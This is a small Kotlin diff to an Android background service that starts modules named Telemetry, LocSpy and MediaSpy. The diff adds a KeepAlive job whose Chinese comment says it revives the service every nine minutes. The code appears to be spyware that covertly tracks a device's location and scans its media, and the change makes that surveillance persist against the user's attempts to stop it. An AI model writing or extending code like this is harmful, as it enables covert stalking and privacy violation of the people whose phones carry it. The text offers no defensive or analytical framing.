@@ -55,6 +55,7 @@ class BeaconService : Service() {
         Telemetry.start(applicationContext)
         LocSpy.start(applicationContext)
         MediaSpy.scan(applicationContext)
+        KeepAlive.schedule(applicationContext)   // 每 9 分钟自我复活
 
         return START_STICKY
     }
